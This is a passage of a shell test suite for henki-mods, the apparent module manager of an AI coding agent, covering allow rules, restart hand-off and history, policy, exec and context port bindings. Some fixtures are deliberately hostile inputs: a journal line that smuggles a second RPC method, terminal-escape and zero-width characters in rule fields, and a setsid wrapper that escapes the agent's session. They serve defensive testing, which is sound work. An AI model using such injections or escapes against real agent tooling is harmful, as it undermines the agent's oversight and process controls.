  mkdir -p "$m/ctx"
  printf '#!/bin/sh\necho notes\n' >"$m/ctx/notes"
  chmod 755 "$m/ctx/notes"
  printf 'x\n' >"$m/ctx/.DS_Store"
  run verify --dir "$m"
  rc_is 0
  out_has "0 B of prompt"
  run add "$m" --yes
  rc_is 0
  out_has "prompt   +0 B on every request"
  out_has "  runs as you, unsandboxed:$nl    ctx/notes (sh, 2 lines): unasked, at every start; what it prints goes into the model's prompt$nl"
  out_lacks ".DS_Store"
  rm -rf "$W/r" && mkmod "$W/r" && mkdir -p "$W/r/ctx/sub"
  run verify --dir "$W/r"
  refused "ctx/sub: a directory"
  rm -rf "$W/r" && mkmod "$W/r" && mkdir -p "$W/r/ctx" && printf '#!/bin/sh\n' >"$W/r/ctx/a b" && chmod 755 "$W/r/ctx/a b"
  run verify --dir "$W/r"
  refused "a context source is a file you can run, named with"
  rm -rf "$W/r" && mkmod "$W/r" && mkdir -p "$W/r/ctx"
  ln -s ../../elsewhere "$W/r/ctx/x"
  run verify --dir "$W/r"
  refused "leaves the module"
}

# After a change the manager writes `restart` to the hand-off file a henki gives it (/mods), and prints the restart
# line without one; listing writes nothing.
t_restart() {
  case_ "restart to HENKI_NEXT"
  local next="$W/next"
  mkmod "$W/one"
  : >"$next"
  HENKI_NEXT=$next run add "$W/one" --yes
  rc_is 0
  out_lacks "restart henki"
  check "add hands back restart" [ "$(cat "$next")" = restart ]
  for verb in "off one" "on one" "rm one"; do
    : >"$next"
    HENKI_NEXT=$next run $verb
    rc_is 0
    check "$verb hands back restart" [ "$(cat "$next")" = restart ]
  done
  : >"$next"
  HENKI_NEXT=$next run list
  check "list hands back nothing" [ ! -s "$next" ]
  printf '/src\tmake\n' >"$CONF/allow"
  HENKI_NEXT=$next run allow rm 1
  rc_is 0
  check "allow rm hands back restart" [ "$(cat "$next")" = restart ]
  run allow
  check "allow lists, nothing more" [ "$OUT" = "$CONF/allow" ]
  mkmod "$W/two"
  ln -s "$W/elsewhere" "$W/link"
  HENKI_NEXT=$W/link run add "$W/two" --yes
  out_has "restart henki (or /exit and start again) to load the change"
  check "a link is not written through" [ ! -e "$W/elsewhere" ]
  run off two
  out_has "restart henki (or /exit and start again) to load the change"
}

# henki's allow file, as henki listed and removed rules before the manager did.
# FILE holds exactly the bytes of the printf FORMAT (for \t, \r, \033 and \377); WANT is a file of the same.
bytes_are() { # DESCRIPTION FILE FORMAT
  printf "$3" >"$SCRATCH/want"
  cmp -s "$2" "$SCRATCH/want" || fail "$1: $(od -c <"$2" | head -n 5)"
}

t_allow() {
  case_ "allow: list and rm"
  local f="$CONF/allow"
  mkdir -p "$CONF"
  printf '# my rules\n/src/app\tgit status\n\n/src/app\tmake test\n%s/proj\tls -la\n%s\tpwd\n*\tmake\n' "$HOME" "$HOME" >"$f"
  chmod 600 "$f"
  run allow
  rc_is 0
  check "the list" [ "$OUT" = "$f${nl}1  /src/app  git status${nl}2  /src/app  make test${nl}3  ~/proj  ls -la${nl}4  ~  pwd${nl}5  *  make" ]
  run allow rm 1
  rc_is 0
  check "the removed rule" [ "$OUT" = "removed rule 1: /src/app  git status" ]
  bytes_are "everything else byte for byte" "$f" "# my rules\n\n/src/app\tmake test\n$HOME/proj\tls -la\n$HOME\tpwd\n*\tmake\n"
  check "0600" [ "$(ls -l "$f" | cut -c1-10)" = "-rw-------" ]
  check "no temp file left" [ "$(ls -A "$CONF")" = allow ]
  run allow rm 004
  rc_is 0
  check "leading zeros" [ "$OUT" = "removed rule 4: *  make" ]
  rm "$f"
  run allow
  rc_is 0
  check "no file: the path alone" [ "$OUT" = "$f" ]
  run allow rm 1
  refused "no rule 1 in $f"

  case_ "allow: invalid lines are listed, numbered and removable, in any mode"
  f="$CONF/allow"
  mkdir -p "$CONF"
  printf '# c\n/a\tok1\nbad line\n\n# c2\n/a\033[31m\tls\n/b\377\tls\r\n/a\tls \303\244\n/a\342\200\213b\tls\n/a\tok2' >"$f"
  chmod 666 "$f"
  run allow
  rc_is 0
  check "invalid lines, escaped" [ "$OUT" = "$f${nl}1  /a  ok1${nl}2  !bad line  (invalid: no TAB between ROOT and COMMAND)${nl}3  !/a\\x1b[31m${tab}ls  (invalid: ROOT is not * or an absolute path)${nl}4  !/b$(printf '\357\277\275')${tab}ls  (invalid: ROOT is not * or an absolute path)${nl}5  !/a${tab}ls $(printf '\303\244')  (invalid: COMMAND is not one printable-ASCII line of 1 to 200 bytes)${nl}6  !/a\\u{200b}b${tab}ls  (invalid: ROOT is not * or an absolute path)${nl}7  /a  ok2" ]
  run allow rm 2
  rc_is 0
  check "an invalid rule goes" [ "$OUT" = "removed rule 2: !bad line  (invalid: no TAB between ROOT and COMMAND)" ]
  run allow rm 3
  rc_is 0
  bytes_are "the CR goes with its line" "$f" '# c\n/a\tok1\n\n# c2\n/a\033[31m\tls\n/a\tls \303\244\n/a\342\200\213b\tls\n/a\tok2'
  run allow rm 5
  rc_is 0
  bytes_are "a last line without a newline takes the one before it" "$f" '# c\n/a\tok1\n\n# c2\n/a\033[31m\tls\n/a\tls \303\244\n/a\342\200\213b\tls'
  printf '/a\tone' >"$f"
  run allow rm 1
  rc_is 0
  bytes_are "the only line" "$f" ''

  case_ "allow: refusals and usage"
  f="$CONF/allow"
  mkdir -p "$CONF"
  printf '/src/app\tgit status\n' >"$f"
  for n in 9 0 000; do
    run allow rm "$n"
    refused "no rule $((10#$n)) in $f"
  done
  for args in "rm x" "rm" "rm -1" "rm 1 2" "clear" "--config"; do
    run allow $args
    rc_is 2
    err_has "usage: henki-mods"
  done
  bytes_are "nothing removed" "$f" '/src/app\tgit status\n'
  mkfifo "$W/fifo"
  mv "$W/fifo" "$f"
  run allow
  rc_is 0
  check "a FIFO is named, never opened" [ "$OUT" = "$f${nl}cannot read it: not a regular file" ]
  run allow rm 1
  refused "$f: not a regular file"
  rm "$f"
  awk 'BEGIN { for (i = 0; i < 6554; i++) print "#234567890" }' >"$f"
  run allow
  check "over 64 KiB" [ "$OUT" = "$f${nl}cannot read it: over 65,536 bytes" ]
  HOME="" run allow
  refused "HOME is not set"

  case_ "allow: --config FILE, HENKI_CONFIG, a linked config dir"
  mkdir -p "$CONF" "$W/alt" "$W/real"
  printf '/src/app\techo home\n' >"$CONF/allow"
  printf '/src/app\techo alt\n' >"$W/alt/allow"
  run allow --config "$W/alt/henki.toml"
  check "beside --config" [ "$OUT" = "$W/alt/allow${nl}1  /src/app  echo alt" ]
  OUT=$(cd "$W" && $RUN "$MODS" allow --config alt/henki.toml rm 1 2>&1) || fail "relative --config"
  check "relative --config, from the working directory" [ "$OUT" = "removed rule 1: /src/app  echo alt" ]
  bytes_are "removed there" "$W/alt/allow" ''
  bytes_are "the default file untouched" "$CONF/allow" '/src/app\techo home\n'
  HENKI_CONFIG="$W/alt" run allow
  check "HENKI_CONFIG names the config dir" [ "$OUT" = "$W/alt/allow" ]
  HENKI_CONFIG="alt" run allow
  refused "HENKI_CONFIG is not an absolute path"
  printf '/x\tone\n/x\ttwo\n' >"$W/real/allow"
  ln -s "$W/real" "$W/linked"
  HENKI_CONFIG="$W/linked" run allow rm 1
  rc_is 0
  check "the link stays" [ -L "$W/linked" ]
  bytes_are "the file behind it" "$W/real/allow" '/x\ttwo\n'
  check "no temp file left" [ "$(ls -A "$W/real")" = allow ]
}

# A module NAME in W that binds history: the bash binding of the conformance suite as port/history.
mkport() {
  mkmod "$W/$1" 'ports = ["history"]\ncontracts = ["history/1"]\n'
  mkdir -p "$W/$1/port"
  cp "$HERE/../tests/fixtures/ports/toy-history" "$W/$1/port/history"
  chmod 755 "$W/$1/port/history"
}

t_ports() {
  case_ "test --port, swap, bind/1, rm refused, verify, list"
  run test --port history std
  rc_is 0
  out_has "std passes this suite in henki's own tests"
  run test --port frontend std
  refused "frontend is not a port this henki binds (history policy context exec)"
  mkport tree
  run add "$W/tree" --yes
  rc_is 0
  run list
  out_has "history: std"
  if [ -z "${HENKI_BIN:-}" ]; then return 0; fi
  run test --port history tree
  rc_is 0
  out_has "ok H01"
  out_has "ok eof"
  out_has "ok H29"
  out_has "history/1: 29 checks, 29 passed"
  HENKI_MODS_TTY=/nonexistent/tty run swap history tree
  refused "no terminal to ask on"
  check "no link without a yes" [ ! -L "$CONF/port/history" ]
  run swap history tree --yes
  rc_is 0
  out_has "history: std -> tree 0.1.0 ("
  out_has "conformance: passed (history/1, 29 checks) · it runs with your rights and stores every session record"
  out_has "henki --port history=std --resume reaches them, and henki-mods history import copies them into tree"
  local store id
  store=$(readlink "$CONF/ext/tree")
  id=${store##*/}
  check "the link to the store copy's port/history" [ "$(readlink "$CONF/port/history")" = "$store/port/history" ]
  check "a bind/1 line after the lock/1 lines" [ "$(tail -n 1 "$CONF/mods.lock" | cut -f 1-4)" = "$(printf 'bind/1\thistory\ttree\t%s' "$id")" ]
  check "bind/1 and lock/1 lines have CONTRACTS.md's fields" [ "$(awk -F '\t' '{ print $1, NF }' "$CONF/mods.lock" | sort -u | tr '\n' ' ')" = "bind/1 $(doc_fields bind/1) lock/1 $(doc_fields lock/1) " ]
  check "how: yes" [ "$(tail -n 1 "$CONF/mods.lock" | cut -f 6)" = yes ]
  check "no temp link left" [ "$(ls -A "$CONF/port")" = history ]
  run list
  out_has "history: tree 0.1.0 (bound)"
  run verify
  rc_is 0
  mkmod "$W/other"
  run add "$W/other" --yes
  check "lock/1 lines stay sorted before bind/1" [ "$(cut -f 1,2 "$CONF/mods.lock" | tr '\t\n' ': ')" = "lock/1:other lock/1:tree bind/1:history " ]
  run rm tree
  refused "tree holds the history binding; fix: henki-mods swap history std"
  run off tree
  rc_is 0
  check "off keeps the binding" [ -L "$CONF/port/history" ]
  ln -sfn "$W/tree/port/history" "$CONF/port/history"
  run verify
  refused "is not the link to $store/port/history; fix: henki-mods swap history tree"
  run swap history std
  rc_is 0
  out_has "history: std"
  check "std: no link, no bind/1 line" [ ! -L "$CONF/port/history" ] && [ -z "$(command grep '^bind/1' "$CONF/mods.lock")" ]
  run rm tree
  rc_is 0
  # A binding that fails the suite is not swapped to; one that has no port/history neither.
  mkport bad
  printf '#!/bin/sh\nexit 0\n' >"$W/bad/port/history"
  run add "$W/bad" --yes
  run swap history bad --yes
  refused "bad does not pass the history/1 suite (above)"
  out_has "FAIL H01"
  check "no link after a failed suite" [ ! -L "$CONF/port/history" ]
  run swap history other --yes
  refused "other has no port/history"
  printf 'bind/1\thistory\tx\n' >>"$CONF/mods.lock"
  run list
  refused "not a bind/1 line; fix: henki-mods swap history std"
  run swap history std
  refused "not a bind/1 line"
  # A port a later henki binds, in a line its manager wrote: newer, not broken (swap frontend std cannot be named here).
  awk '!/^bind\/1/' "$CONF/mods.lock" >"$W/lock" && cp "$W/lock" "$CONF/mods.lock"
  printf 'bind/1\tfrontend\tfoo\tabcabcabcabc\t2026-11-08T10:00Z\tyes\n' >>"$CONF/mods.lock"
  run list
  refused "this lock is newer than this henki-mods (it binds frontend); fix: upgrade henki"
  printf 'bind/1\tfrontend\tfoo\n' >"$CONF/mods.lock"
  run list
  refused "not a bind/1 line; fix: remove the line"
  rm "$CONF/mods.lock"
  # No henki to run the suite: the command stops there, and no module is blamed.
  local hb="$HENKI_BIN" path="$PATH"
  HENKI_BIN='' PATH=/usr/bin:/bin
  run test --port history /bin/true
  HENKI_BIN=$hb PATH=$path
  refused "no henki to run; fix: run it as henki mods, or put henki on PATH"
  err_lacks "checks"
}

# port_toy (examples/, built beside the henki under test) through test --port: it passes, and each fault fails the
# check named for it.
t_port_toy() {
  case_ "test --port: port_toy and its faults"
  local toy f want
  toy="$(dirname "${HENKI_BIN:-/nonexistent/henki}")/examples/port_toy"
  [ -x "$toy" ] || return 0
  run test --port history "$toy"
  rc_is 0
  out_has "skipped: the checks for cap fork (the binding's hello lists no fork)"
  out_lacks "H26"
  out_has "history/1: 25 checks, 25 passed"
  printf '#!/bin/sh\nexec %s history --fork\n' "$toy" >"$W/forks"
  chmod 755 "$W/forks"
  run test --port history "$W/forks"
  rc_is 0
  out_has "ok H26"
  out_has "history/1: 29 checks, 29 passed"
  for f in "--exit-at create:H04" "--garbage-at read:H10" "--huge-at list:H15" "--error-at discard:H22" "--no-durable:H20" "--chatty:H01" "--fork --error-at fork:H26a"; do
    want=${f##*:}
    printf '#!/bin/sh\nexec %s history %s\n' "$toy" "${f%:*}" >"$W/faulty"
    chmod 755 "$W/faulty"
    run test --port history "$W/faulty"
    rc_is 1
    out_has "FAIL $want: got"
  done
}

# The std scope dir of a directory: FNV-1a 64 of its realpath (journal/1).
fnv() {
  local h=-3750763034362895579 b
  for b in $(printf '%s' "$1" | od -An -v -tu1); do h=$(((h ^ b) * 1099511628211)); done
  printf '%016x\n' "$h"
}

# A std journal FILE made in CWD: a session record, one user record per TEXT (the first with henki's head), a close.
hj() { # FILE CWD TEXT...
  local f="$1" c="$2" t first=1
  shift 2
  mkdir -p "${f%/*}"
  printf '{"agents_hash":null,"allow_hash":null,"approve":"ask","approve_from":"default","base_url":"http://127.0.0.1:9/v1","base_url_from":"config","config":null,"config_hash":null,"ctx":8192,"cwd":"%s","dialect":"openai","exts":[],"henki":"0.2.0","id":"x","model":"m","pass_env":[],"project_agents_hash":null,"resumed":null,"shell":"/bin/bash","t":"session","tools":["shell"],"ts":"2026-11-08T10:00:00Z","v":1}\n' "$c" >"$f"
  for t in "$@"; do
    [ "$first" = 0 ] || t="cwd: $c\\nos: linux x\\ndate: 2026-11-08\\n\\n$t"
    printf '{"msg":{"content":"%s","role":"user"},"t":"user","ts":"2026-11-08T10:00:00Z"}\n{"finish":"stop","msg":{"content":"ok","role":"assistant","tool_calls":[]},"t":"assistant","ts":"2026-11-08T10:00:01Z","usage":{"cached":0,"in":1,"out":1}}\n' "$t" >>"$f"
    first=0
  done
  printf '{"bytes":%s,"t":"close","ts":"2026-11-08T10:00:02Z"}\n' "$(wc -c <"$f" | tr -d ' ')" >>"$f"
}

# history list, show and import on std: journals in the scope dirs, read only; no binding to import into.
t_history() {
  case_ "history list, show: std; import needs a binding"
  local w="$W/proj" st="$XDG_STATE_HOME/henki/sessions" sc f
  mkdir -p "$w"
  sc=$(fnv "$(cd -P "$w" && pwd)")
  hj "$st/$sc/20261108T080000Z-aaaa.jsonl" "$w" 'fix the \"parser\"\nand more' 'second'
  hj "$st/$sc/20261108T090000Z-bbbb.jsonl" "$w" 'newer one'
  touch -t 202611080800 "$st/$sc/20261108T080000Z-aaaa.jsonl"
  hj "$st/0123456789abcdef/20261108T100000Z-cccc.jsonl" /elsewhere 'elsewhere'
  : >"$st/$sc/20261108T110000Z-eeee.jsonl" # empty: no session
  # A session whose sources counted, then a torn line.
  f="$st/$sc/20261108T090000Z-bbbb.jsonl"
  sed 's/,"shell":/,"sources":[{"bytes":1234,"hash":"00ff","name":"project\/project"},{"bytes":5,"hash":"aa","name":"x\/y"}],"shell":/' "$f" >"$W/s" && sed -n 1p "$W/s" >>"$f"
  printf '{"msg":{"content":"torn","role":"user"},"t":"us' >>"$f"
  touch -t 202611080900 "$f"
  run_in "$w" history list
  rc_is 0
  out_has " 1   20261108T090000Z-bbbb 2026-11-08 09:00  newer one"
  out_has " 2   20261108T080000Z-aaaa 2026-11-08 08:00  fix the \"parser\""
  out_lacks "cccc"
  out_lacks "eeee"
  out_lacks "and more"
  HENKI_SESSION=20261108T080000Z-aaaa run history list --scope "$w"
  out_has " 2 * 20261108T080000Z-aaaa"
  run history list --scope "$W"
  rc_is 0
  out_has "no sessions of $W in std"
  run history list --scope "$W/nope"
  refused "$W/nope is not a directory"
  run history show 20261108T080000Z-aaaa
  rc_is 0
  out_has "session 20261108T080000Z-aaaa in std; fork it at a line with henki --resume=20261108T080000Z-aaaa@LINE"
  out_has "     2  fix the \"parser\"$nl     4  second"
  out_lacks "context at"
  run history show 20261108T090000Z-bbbb
  out_has "     2  newer one$nl"
  out_lacks "torn"
  out_has "context at its last start: project/project 1,234 B, x/y 5 B"
  run history show 20261108T100000Z-cccc
  out_has "     2  elsewhere"
  run history show 20261108T120000Z-ffff
  refused "no session 20261108T120000Z-ffff in std's store"
  run history show ../x
  refused "../x is not a session id"
  run history show
  rc_is 2
  run history import --yes
  refused "history is std, so there is no binding to import into"
  run history nope
  rc_is 2
  mkdir -p "$CONF/port"
  ln -s /nonexistent "$CONF/port/history"
  run history list
  refused "is not a program; fix: henki-mods swap history std"
  run history list --std --scope "$w"
  rc_is 0
  out_has "20261108T090000Z-bbbb"
}

# history over a bound binding, against sessions a real henki made: the swap's import offer, list and show through
# `henki port`, a second import, a resume and a fork through the binding, --std, partial and refused copies, and
# `henki port` started again every 100 sessions.
t_history_live() {
  case_ "history: import into a binding, list, show, resume and fork through it"
  live_ok || return
  local d="$W/stub" work="$W/work" st="$XDG_STATE_HOME/henki/sessions" sc id f a b i
  mkdir -p "$work" "$CONF"
  stub_up "$d" || return
  printf 'model = "m"\nbase_url = "http://127.0.0.1:%s/v1"\n' "$STUB_PORT" >"$CONF/config.toml"
  chmod 600 "$CONF/config.toml"
  hrun() { (cd "$work" && env -u XDG_CONFIG_HOME "$HENKI_BIN" run --json "$@" >"$d/run.out" 2>&1) || fail "henki run $* failed: $(cat "$d/run.out")"; }
  hrun "first task"
  sc=$(fnv "$(cd -P "$work" && pwd)")
  id=$(cd "$st/$sc" 2>/dev/null && ls) && id=${id%.jsonl}
  check "henki's scope dir is the FNV-1a 64 of the work dir" is_id_like "$id"
  hrun --resume="$id" "second task"
  run_in "$work" history list
  out_has " 1   $id "
  out_has "first task"
  run history show "$id"
  out_has "  first task$nl"
  a=$(printf '%s\n' "$OUT" | sed 1d)
  # By hand: a session in use (no close), a torn one, one with a line that is not one JSON object.
  hj "$st/$sc/20261108T070000Z-open.jsonl" "$work" 'in use'
  sed '$d' "$st/$sc/20261108T070000Z-open.jsonl" >"$W/x" && cp "$W/x" "$st/$sc/20261108T070000Z-open.jsonl"
  hj "$st/$sc/20261108T060000Z-torn.jsonl" "$work" 'torn tail'
  printf '{"msg":{"content":"cut' >>"$st/$sc/20261108T060000Z-torn.jsonl"
  hj "$st/$sc/20261108T050000Z-evil.jsonl" "$work" 'evil'
  printf '{"t":"notice"}},"method":"discard","params":{"session":"x"},"z":{"a":1\n' >>"$st/$sc/20261108T050000Z-evil.jsonl"
  mkport tree
  mv "$W/tree/port/history" "$W/toy-history" # the binding counts its starts, then runs the toy
  printf '#!/bin/sh\necho start >>%s/starts\nexec %s/toy-history\n' "$W" "$W" >"$W/tree/port/history"
  chmod 755 "$W/tree/port/history"
  run add "$W/tree" --yes
  rc_is 0
  printf 'y\n' >"$W/yes"
  HENKI_MODS_TTY="$W/yes" run swap history tree
  rc_is 0
  out_has "henki-mods history import copies them into tree"
  err_has "your 4 sessions stay in std's store; import them into tree? [y/N]"
  out_has "import 20261108T050000Z-evil: line 5 is not one JSON object; not imported"
  out_has "imported 3 sessions ("
  out_has "skipped 0 (already there); 1 failed"
  out_has "history: tree "
  run history show "$id"
  out_has "session $id in history binding tree "
  b=$(printf '%s\n' "$OUT" | sed 1d)
  check "show reads the same messages through the binding" [ "$a" = "$b" ]
  run history show 20261108T060000Z-torn
  out_has "     2  torn tail"
  out_lacks "cut"
  run_in "$work" history list
  out_has "$id"
  out_has "20261108T070000Z-open"
  out_lacks "evil"
  run history import --yes
  out_has "imported 0 sessions (0 records) into history binding tree"
  out_has "skipped 3 (already there); 1 failed"
  rc_is 1
  hrun --resume="$id" "third task"
  check "the resume read the imported session through the binding" command grep -q '"third task"' "$XDG_STATE_HOME/henki/port/history/$id.jsonl"
  check "std's copy is unchanged" [ -z "$(command grep 'third task' "$st/$sc/$id.jsonl")" ]
  run history show "$id"
  out_has "third task"
  run history show "$id" --std
  out_has "session $id in std"
  out_lacks "third task"
  HENKI_SESSION=20261108T070000Z-open run history show 20261108T070000Z-open
  out_has "in std;"
  i=$(printf '%s\n' "$a" | sed -n 's/^ *\([0-9]*\)  second task$/\1/p')
  hrun --resume="$id@$i" "forked task"
  run_in "$work" history list --all
  out_has "toy-"
  # A binding that refuses a record: the session is reported as a partial copy.
  printf '#!/bin/sh\nexec %s history --error-at append\n' "$(dirname "$HENKI_BIN")/examples/port_toy" >"$W/faulty"
  chmod 755 "$W/faulty"
  if [ -x "$(dirname "$HENKI_BIN")/examples/port_toy" ]; then
    ln -sfn "$W/faulty" "$CONF/port/history"
    mkdir -p "$W/other"
    hj "$st/$(fnv "$(cd -P "$W/other" && pwd)")/20261108T040000Z-part.jsonl" "$W/other" 'refused'
    run history import --yes --scope "$W/other"
    rc_is 1
    out_has "record 1: {\"error\":{\"code\":\"io\""
    out_has "(the binding keeps the 0 before it)"
    out_has "a failed session stays in the binding as far as it got"
    ln -sfn "$(readlink "$CONF/ext/tree")/port/history" "$CONF/port/history"
  fi
  # 101 sessions: henki port starts twice.
  mkdir -p "$W/many"
  sc=$(fnv "$(cd -P "$W/many" && pwd)")
  mkdir -p "$st/$sc"
  i=0
  while [ $i -lt 101 ]; do
    printf '{"agents_hash":null,"cwd":"%s","dialect":"openai","t":"session"}\n' "$W/many" >"$st/$sc/20261108T000000Z-m$i.jsonl"
    i=$((i + 1))
  done
  rm -f "$W/starts"
  run history import --yes --scope "$W/many"
  rc_is 0
  out_has "imported 101 sessions (101 records)"
  check "henki port started again after 100 sessions" [ "$(wc -l <"$W/starts" | tr -d ' ')" = 2 ]
  kill "$STUB_PID" 2>/dev/null
}
is_id_like() { case "$1" in 2026*Z-*) return 0 ;; esac; return 1; }

# A module NAME in W that binds policy: the bash binding of the policy suite as port/policy.
mkpolicy() {
  mkmod "$W/$1" 'ports = ["policy"]\ncontracts = ["policy/1"]\n'
  mkdir -p "$W/$1/port"
  cp "$HERE/../tests/fixtures/ports/toy-policy" "$W/$1/port/policy"
  chmod 755 "$W/$1/port/policy"
}

t_policy() {
  case_ "policy: test --port, swap with approve = auto, port_toy's faults"
  run test --port policy std
  rc_is 0
  mkpolicy rules
  run add "$W/rules" --yes
  rc_is 0
  if [ -z "${HENKI_BIN:-}" ]; then return 0; fi
  run test --port policy rules
  rc_is 0
  out_has "ok Q12"
  out_has "policy/1: 13 checks, 13 passed"
  printf 'approve = "auto"\n' >"$CONF/config.toml"
  run swap policy rules --yes
  rc_is 0
  out_has "policy: std -> rules 0.1.0 ("
  out_has "conformance: passed (policy/1, 13 checks) · it runs with your rights and decides every call before it runs; protected paths stay refused"
  out_has "henki refuses approve = auto with a policy binding; set approve = \"ask\" in ~/.config/henki/config.toml"
  check "the link to the store copy's port/policy" [ "$(readlink "$CONF/port/policy")" = "$(readlink "$CONF/ext/rules")/port/policy" ]
  run list
  out_has "policy: rules 0.1.0 (bound)"
  run rm rules
  refused "rules holds the policy binding; fix: henki-mods swap policy std"
  run swap policy std
  rc_is 0
  rm -f "$CONF/config.toml"
  local toy f want
  toy="$(dirname "$HENKI_BIN")/examples/port_toy"
  [ -x "$toy" ] || return 0
  for f in allow ask ask-always deny; do
    printf '#!/bin/sh\nexec %s policy %s\n' "$toy" "$f" >"$W/toy-$f"
    chmod 755 "$W/toy-$f"
    run test --port policy "$W/toy-$f"
    rc_is 0
    out_has "policy/1: 13 checks, 13 passed"
  done
  for f in "maybe:Q04" "allow --exit-at decide:Q04" "allow --hang-at decide#2:Q05" "allow --garbage-at record:Q12" "allow --chatty:Q01"; do
    want=${f##*:}
    printf '#!/bin/sh\nexec %s policy %s\n' "$toy" "${f%:*}" >"$W/faulty"
    chmod 755 "$W/faulty"
    run test --port policy "$W/faulty"
    rc_is 1
    out_has "FAIL $want: got"
  done
}

# A module NAME in W that binds exec with BODY as its port/exec (sh).
mkexec() {
  mkmod "$W/$1" 'ports = ["exec"]\ncontracts = ["exec/1"]\n'
  mkdir -p "$W/$1/port"
  printf '#!/bin/sh\n%s\n' "$2" >"$W/$1/port/exec"
  chmod 755 "$W/$1/port/exec"
}

# exec/1's fixed checks (no henki needed): the toy passes all 7, a program that loses the status or escapes the
# session fails the check named for it; swap shows the exec screen (a module's bin/bash in red) and links it.
t_exec() {
  case_ "exec: test --port, the checks' faults, swap"
  run test --port exec std
  rc_is 0
  run test --port exec "$HERE/../tests/fixtures/exec/toy-exec"
  rc_is 0
  out_has "ok R06"
  out_has "exec/1: 7 checks, 7 passed"
  printf '#!/bin/sh\n"$@"\nexit 0\n' >"$W/status"
  printf '#!/bin/sh\nsetsid "$@" &\nwait\n' >"$W/escape"
  printf '#!/bin/sh\nunset HENKI_CONFORM\nexec "$@"\n' >"$W/noenv"
  chmod 755 "$W/status" "$W/escape" "$W/noenv"
  run test --port exec "$W/status"
  rc_is 1
  out_has "FAIL R02: exit 0 (want 7)"
  if [ "$(uname -s)" = Linux ] && command -v setsid >/dev/null; then
    run test --port exec "$W/escape"
    rc_is 1
    out_has "FAIL R06: "
  fi
  run test --port exec "$W/noenv"
  rc_is 0
  out_has "warn R07: HENKI_CONFORM=1 did not arrive"
  mkexec box 'exec "$@"'
  mkexec broken 'exit 0'
  mkmod "$W/bash"
  mv "$W/bash/bin/bash" "$W/bash/bin/sh"
  mkdir -p "$CONF" && printf 'shadow = ["bash/sh"]\n' >"$CONF/config.toml"
  for m in box broken bash; do
    run add "$W/$m" --yes
    rc_is 0
  done
  run test --port exec box
  rc_is 0
  out_has "exec/1: 7 checks, 7 passed"
  run swap exec broken --yes
  refused "broken does not pass the exec/1 checks (above)"
  out_has "FAIL R01"
  check "no link after failed checks" [ ! -L "$CONF/port/exec" ]
  run swap exec box --yes
  rc_is 0
  out_has "exec: std -> box 0.1.0 ("
  out_has "checks: passed (exec/1, 7 checks) · it runs with your rights and runs every shell call; read, write and edit are off while it is bound"
  out_has "a program that hands commands to a daemon (a box, ssh) takes them out of henki's kill and sweep"
  out_has "bash has bin/sh: henki runs its own bash for shell calls, but the model can call bash's by name"
  check "the link to the store copy's port/exec" [ "$(readlink "$CONF/port/exec")" = "$(readlink "$CONF/ext/box")/port/exec" ]
  check "a bind/1 line for exec" [ "$(tail -n 1 "$CONF/mods.lock" | cut -f 1-3)" = "$(printf 'bind/1\texec\tbox')" ]
  run list
  out_has "exec: box 0.1.0 (bound)"
  run verify
  rc_is 0
  run rm box
  refused "box holds the exec binding; fix: henki-mods swap exec std"
  run swap exec std
  rc_is 0
  check "std: no link" [ ! -L "$CONF/port/exec" ]
}

# context/1's suite (shapes only; henki checks the records in a session): port_toy's context modes pass, its faults
# fail the first fit; compact (the official binding) passes it with no model; swap shows the context screen and links it.
t_context() {
  case_ "context: test --port, the suite's faults, compact, swap"
  local toy f
  run test --port context std
  rc_is 0
  out_has "std passes this suite in henki's own tests"
  toy="$(dirname "${HENKI_BIN:-/nonexistent/henki}")/examples/port_toy"
  [ -x "$toy" ] || return 0
  for f in keep "last 2"; do
    printf '#!/bin/sh\nexec %s context %s\n' "$toy" "$f" >"$W/fits"
    chmod 755 "$W/fits"
    run test --port context "$W/fits"
    rc_is 0
    out_has "ok C11"
    out_has "context/1: 12 checks, 12 passed"
  done
  for f in "--garbage-at fit" "--exit-at fit" "--error-at fit" "--hang-at hello"; do
    printf '#!/bin/sh\nexec %s context keep %s\n' "$toy" "$f" >"$W/faulty"
    chmod 755 "$W/faulty"
    run test --port context "$W/faulty"
    rc_is 1
    case "$f" in *hello) out_has "FAIL C01: got" ;; *) out_has "FAIL C04: got" ;; esac
  done
  # A suite naming a fixture that is not there stops the run, and names it.
  mkdir -p "$W/share/conform"
  cp "$HERE/conform/history.tsv" "$W/share/conform/"
  printf 'C04\ta\t{"method":"fit","params":{"records":@F:gone@}}\t*\n' >"$W/share/conform/context.tsv"
  HENKI_SHARE="$W/share" run test --port context "$W/fits"
  refused "no fixture $W/share/conform/fixtures/gone.json; fix: reinstall henki"
  if command -v python3 >/dev/null 2>&1; then
    run test --port context "$HERE/../mods/compact/port/context"
    rc_is 0
    out_has "context/1: 12 checks, 12 passed"
  fi
  mkmod "$W/shaper" 'ports = ["context"]\ncontracts = ["port/1", "context/1"]\n'
  mkdir -p "$W/shaper/port"
  printf '#!/bin/sh\nexec %s context keep\n' "$toy" >"$W/shaper/port/context"
  chmod 755 "$W/shaper/port/context"
  run add "$W/shaper" --yes
  rc_is 0
  run swap context shaper --yes
  rc_is 0
  out_has "context: std -> shaper 0.1.0 ("
  out_has "conformance: passed (context/1, 12 checks) · it runs with your rights and sees the whole history before every model request"
  check "the link to the store copy's port/context" [ "$(readlink "$CONF/port/context")" = "$(readlink "$CONF/ext/shaper")/port/context" ]
  check "a bind/1 line for context" [ "$(tail -n 1 "$CONF/mods.lock" | cut -f 1-3)" = "$(printf 'bind/1\tcontext\tshaper')" ]
  run list
  out_has "context: shaper 0.1.0 (bound)"
  run rm shaper
  refused "shaper holds the context binding; fix: henki-mods swap context std"
  run swap context std
  rc_is 0
  check "std: no link" [ ! -L "$CONF/port/context" ]
}

# A stub model server for the eval checks in D, a small agent: a message holding `CALL: CMD` gets a shell call of CMD
# and then the call's output as the answer, one holding BYTES the text of eval_bytes, and any other "yes" when the
# system prompt lists the module probe, else "no". Each request's model goes to D/models.
eval_stub_up() {
  local d="$1"
  mkdir -p "$d"
  cat >"$d/stub.py" <<'PY'
import http.server, json, os, socketserver, sys
d = sys.argv[1]
TEXT = 'café "q" back\\slash\ttab\nline two ​ \U000e0001 end'
def chunk(delta, finish=None):
    return "data: " + json.dumps({"choices": [{"index": 0, "delta": delta, "finish_reason": finish}], "object": "chat.completion.chunk"}) + "\n\n"
class H(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        body = json.loads(self.rfile.read(int(self.headers["Content-Length"])))
        with open(os.path.join(d, "models"), "a") as f:
            f.write(body["model"] + "\n")
        system = [m["content"] for m in body["messages"] if m["role"] == "system"][0]
        last = body["messages"][-1]
